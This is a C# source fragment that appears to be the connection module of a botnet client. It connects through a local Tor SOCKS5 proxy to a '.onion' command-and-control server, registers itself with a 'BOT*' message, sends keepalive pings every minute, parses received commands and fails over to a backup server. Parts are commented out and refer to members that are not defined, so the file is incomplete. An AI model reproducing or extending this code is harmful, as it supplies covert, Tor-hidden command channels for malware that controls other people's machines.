using System;
using System.IO;
using System.Linq;
using System.Net;
using com.LandonKey.SocksWebProxy;
using System.Threading;
using Starksoft.Aspen.Proxy;
using System.Net.Sockets;

internal static partial class Connect
{
    public static Thread TCPThread = new Thread(new ThreadStart(connect));
    public static TcpClient TCP;
    public static StreamWriter Write;
    public static StreamReader Read;
    private static string server = ".onion";
    private static int port = 44359;
    private delegate void MessageReceived(string msg);
    private static event MessageReceived MSG;
    private static Socks5ProxyClient proxyClient;
    // Public Stream As NetworkStream

    /*public static void Post(string msg, string hiddensite)
    {
        try
        {
            Console.WriteLine(msg);
            HttpWebRequest request;
            HttpWebResponse response;
            var config = new com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, 9150, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five);
            request = (HttpWebRequest)WebRequest.Create("http://" + hiddensite + "/index.php?" + msg);
            request.Proxy = new SocksWebProxy(config);
            request.KeepAlive = false;
            response = (HttpWebResponse)request.GetResponse;
        }
        catch
        {
        }
    }*/
    public static void Send(string MSG) // Send MSG
    {
        try
        {
            Write = new StreamWriter(TCP.GetStream());
            Write.WriteLine(MSG);
            Write.Flush();
        }
        catch (Exception ex)
        {
        }
    }
    public static void Connection_read(IAsyncResult ar)
    {
        try
        {
            Read = new StreamReader(TCP.GetStream());
            MSG?.Invoke(Read.ReadLine());
            TCP.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(Connection_read), null);
        }
        catch
        {
            Thread.Sleep(1000);
            try
            {
                TCP.Close();
            }
            catch
            {
            }
            //connect();
        }
    }
    public static void SendPing() // Connect reserve
    {
        while (true)
        {
            try
            {
                Send("l");
            }
            catch
            {
            }
            Thread.Sleep(60000);
        }
    }
    /*public static void connect() // Start Connect
    {
        try
        {
            proxyClient = new Socks5ProxyClient("127.0.0.1", 9150);
            TCP = proxyClient.CreateConnection(Server, port);
            // Stream = Client.GetStream()

            // TCP = New TcpClient(Server, port)

            Send(string.Format("BOT*" + BotName()));

            if (keepalive == false)
            {
                keepalive = true;
                var ping = new Thread(SendPing);
                ping.Start();
            }
            if (readlines == false)
            {
                readlines = true;
                MSG += Parsecommands;
            }

            TCP.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(Connection_read), null);
        }
        catch
        {
            try
            {
                if (WhatToRun.Contains("y"))
                {
                    if (Server == Settings[1])
                        Server = BackupDNS;
                    else
                        Server = Settings[1];
                }
                TCP.Close();
            }
            catch (Exception ex)
            {
            }
            Thread.Sleep(10000);
            connect();
        }*/
    }
}

